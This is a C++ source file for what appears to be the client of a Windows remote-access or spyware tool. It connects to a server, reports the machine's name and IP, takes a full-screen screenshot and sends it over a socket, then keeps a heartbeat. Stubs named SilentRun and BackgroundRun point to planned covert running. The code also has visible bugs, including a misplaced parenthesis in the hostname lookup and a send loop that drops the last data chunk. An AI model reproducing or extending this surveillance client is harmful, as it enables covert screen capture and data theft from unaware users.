#include <iostream>
#pragma comment(lib, "ws2_32.lib")
#include <string>
#include <WinSock2.h>
#include <chrono>
#include <windows.h>
#include <string>
#include <thread>
#include <fstream>
#include <lmcons.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma warning(disable: 4996)

SOCKET Connection;

using namespace std;

struct ClientRuntime {
	chrono::system_clock::time_point start_time;
	chrono::seconds runtime;
};

void SendData(SOCKET sock, const string& data) {
	send(sock, data.c_str(), data.length(), 0);
}

int RecData(SOCKET sock, char* buffer, int buffer_size) {
	return recv(sock, buffer, buffer_size, 0);
}


string GetComputerName() {
	const int MAX_COMPUTER_NAME = 15;
	char hostname[MAX_COMPUTER_NAME + 1];
	DWORD size = MAX_COMPUTER_NAME + 1;
	if (GetComputerNameA(hostname, &size)) {
		return hostname;
	}
	return "";
}

string GetLocalIp() {
	char hostname[256];
	if (gethostname(hostname, sizeof(hostname) == 0)) {
		hostent  *hostinfo = gethostbyname(hostname);
		if (hostinfo) {
			return string(inet_ntoa(*(struct in_addr*)hostinfo->h_addr));
		}
	}
	return "";
}

bool CaptureScreenshot(const string& filename) {
	HDC hdc = GetDC(NULL);
	if (!hdc) {
		return false;
	}

	int width = GetDeviceCaps(hdc, HORZRES);
	int height = GetDeviceCaps(hdc, VERTRES);

	HBITMAP bitmap = CreateCompatibleBitmap(hdc, width, height);
	if (!bitmap) {
		ReleaseDC(NULL, hdc);
		return false;
	}

	HDC hdcMem = CreateCompatibleDC(hdc);
	if (!hdcMem) {
		DeleteObject(bitmap);
		ReleaseDC(NULL, hdc);
		return false;
	}

	HGDIOBJ oldBitmap = SelectObject(hdcMem, bitmap);
	if (!BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY)) {
		SelectObject(hdcMem, oldBitmap);
		DeleteObject(bitmap);
		DeleteDC(hdcMem);
		ReleaseDC(NULL ,hdc);
		return false;
	}

	BITMAPFILEHEADER bmpFileHeader;
	BITMAPINFOHEADER bmpInfoHeader;

	bmpFileHeader.bfType = 0x4D42;
	bmpFileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + width * height * 3;
	bmpFileHeader.bfReserved1 = 0;
	bmpFileHeader.bfReserved2 = 0;
	bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpInfoHeader.biWidth = width;
	bmpInfoHeader.biHeight = height;
	bmpInfoHeader.biPlanes = 1;
	bmpInfoHeader.biBitCount = 24;
	bmpInfoHeader.biCompression = BI_RGB;
	bmpInfoHeader.biSizeImage = 0;
	bmpInfoHeader.biXPelsPerMeter = 0;
	bmpInfoHeader.biYPelsPerMeter = 0;
	bmpInfoHeader.biClrUsed = 0;
	bmpInfoHeader.biClrImportant = 0;

	ofstream file(filename, ios::binary);
	if (!file.is_open()) {
		SelectObject(hdcMem, oldBitmap);
		DeleteObject(bitmap);
		DeleteDC(hdcMem);
		ReleaseDC(NULL, hdc);
		return false;
	}

	file.write((char*)&bmpFileHeader, sizeof(BITMAPFILEHEADER));
	file.write((char*)&bmpInfoHeader, sizeof(BITMAPINFOHEADER));

	for (int y = height - 1; y >= 0; y--) {
		for (int x = 0; x < width; x++) {
			COLORREF color = GetPixel(hdcMem, x, y);
			unsigned char red = GetRValue(color);
			unsigned char green = GetGValue(color);
			unsigned char blue = GetBValue(color);
			file.write((char*)&blue, 1);
			file.write((char*)&green, 1);
			file.write((char*)&red, 1);
		}
	}

	file.close();
	SelectObject(hdcMem, oldBitmap);
	DeleteObject(bitmap);
	DeleteDC(hdcMem);
	ReleaseDC(NULL, hdc);

	return true;
}

bool SendScreenshot(SOCKET sock) {
	string screenshotFilename = "screenshot.bmp";

	if (!CaptureScreenshot(screenshotFilename)) {
		return false;
	}

	ifstream file(screenshotFilename, ios::binary);
	if (!file.is_open()) {
		return false;
	}

	streamsize size = file.seekg(0, ios::end).tellg();
	file.seekg(0, std::ios::beg);

	string size_str = to_string(size);
	SendData(sock, size_str);

	char buffer[1024];
	while (file.read(buffer, sizeof(buffer))) {
		SendData(sock, string(buffer, sizeof(buffer)));
	}

	file.close();

	return true;
}

void SilentRun() {

}

void BackgroundRun() {

}


int main(int argc, char* argv[]) {
	
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(1111);
	addr.sin_family = AF_INET;

	SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
	if (Connection == INVALID_SOCKET) {
		cerr << "Error: invalid socket..." << endl;
		WSACleanup();
		return 0;
	}

	if (connect(Connection, (SOCKADDR*)&addr, sizeofaddr) == SOCKET_ERROR) {
		cout << "Error: failed connect to server!" << endl;
		closesocket(Connection);
		WSACleanup();
		return 0;
	}
	

	string user_data = "user: machine:" + GetComputerName() + ";ip:" + GetLocalIp();
	SendData(Connection, user_data);

	SendScreenshot(Connection);

	while (true) {
		Sleep(10000);
		SendData(Connection, "heartbeat");
	}

	closesocket(Connection);
	WSACleanup();

	return 1;
}
